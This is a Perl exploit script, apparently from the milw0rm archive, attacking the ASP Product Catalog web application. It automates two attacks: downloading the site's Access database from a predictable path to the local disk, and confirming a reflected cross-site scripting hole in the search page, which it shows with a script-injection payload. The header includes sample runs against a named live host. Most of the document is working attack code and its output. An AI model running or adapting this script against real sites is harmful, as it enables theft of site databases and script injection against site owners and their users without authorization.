#!/usr/bin/perl
# By AlpHaNiX [NullArea.Net]
# alpha[at]hacker.bz
# Made in Tunisia
###########
# script : ASP Product Catalog Multiple Remote Exploits
# download : http://sourceforge.net/project/showfiles.php?group_id=136315
# script homepage : http://aspprocatalog.sourceforge.net/
###########
# Vulnerable :
# XSS : In Search ,
# Example :
# http://h.1asphost.com/humayuns/aspProductCatalog/search.asp?keywords="><script>alert(1)</script>
# Database Disclosure
# Path : database/aspProductCatalog.mdb
##########
# Real Life Example : XSS
# OOO  OOO           OO    OO        OO
#  OO   O             O     O         O
#  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO
#  O  O O   O   O     O     O        OOO    OO     OOOOOO       O
#  O   OO   O   O     O     O       O   O   O      O       OOOOOO
# OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO
#
#
#[-] ASP Product Catalog Multiple Remote Exploits
#[-] Found & Exploited By AlpHaNiX
#
#
#[!] Exploiting http://h.1asphost.com/humayuns/aspProductCatalog// ....
#[!] http://h.1asphost.com/humayuns/aspProductCatalog/ Exploited !
#[!] http://h.1asphost.com/humayuns/aspProductCatalog/search.asp?keywords="><script>alert(1)</script>
##########
# Real Life Example : Database Disclosure
# OOO  OOO           OO    OO        OO
#  OO   O             O     O         O
#  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO
#  O  O O   O   O     O     O        OOO    OO     OOOOOO       O
#  O   OO   O   O     O     O       O   O   O      O       OOOOOO
# OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO
#
#
#[-] ASP Product Catalog Multiple Remote Exploits
#[-] Found & Exploited By AlpHaNiX
#
#
#[!] Exploiting http://h.1asphost.com/humayuns/aspProductCatalog// ....
#[!] http://h.1asphost.com/humayuns/aspProductCatalog/ Exploited ! database saved to c:/db.mdb
##########
# Greetz for Zigma/Djek/unary/r1z

use lwp::UserAgent;

system('cls');
system('title ASP Product Catalog Multiple Remote Exploits');
system('color 2');
if (!defined($ARGV[0] && $ARGV[1])) {print "[!] Usage : \n    ./exploit http://site.com -DD\n    ./exploit http://site.com -XSS\n";exit();}
if ($ARGV[0] =~ /http:\/\// ) { $site = $ARGV[0]."/"; } else { $site = "http://".$ARGV[0]."/"; }
my @array;
print "\n\n\n\n OOO  OOO           OO    OO        OO\n" ;
print "  OO   O             O     O         O\n" ;
print "  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO\n" ;
print "  O  O O   O   O     O     O        OOO    OO     OOOOOO       O\n" ;
print "  O   OO   O   O     O     O       O   O   O      O       OOOOOO\n" ;
print " OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO\n" ;
print "\n\n[-] ASP Product Catalog Multiple Remote Exploits\n";
print "[-] Found & Exploited By AlpHaNiX \n\n\n";
print "[!] Exploiting $site ....\n";
my $bug        = $ARGV[1] ;
my $site       = $ARGV[0] ;
my $targetdd   = $site."database/aspProductCatalog.mdb" ;

if ($bug eq '-DD')
{
     my $useragent = LWP::UserAgent->new(agent => "Mozilla 5.5");
     my $request   = $useragent->get($targetdd,":content_file" => "c:/db.mdb");
         if ($request->is_success)
             {
                 print "[!] $site Exploited ! database saved to c:/db.mdb\n";
             }
         else {print "[!] Exploiting $site Failed !\n[!] ".$request->status_line."\n";exit();}
}


elsif ($bug eq '-XSS')
{
     my $useragent = LWP::UserAgent->new(agent => "Mozilla 5.5");
     my $request   = $useragent->get("$site"."search.asp?keywords=ALPHANIXNULLAREA");
         if ($request->is_success)
             {
                 if ($request->content =~ m/ALPHANIXNULLAREA/i){print "[!] $site Exploited !\n[!] $site"."search.asp?keywords=\"><script>alert(1)<\/script>\n";}
                 else {print "[!] Exploiting $site Failed !\n";}
             }
         else {print "[!] Exploiting $site Failed !\n[!] ".$request->status_line."\n";exit();}


}

else
{
print "[!] Please Choose a valid flag -DD for database disclosure & -XSS For Cross Site Scripting\n";
exit();
}

# milw0rm.com [2009-04-13]
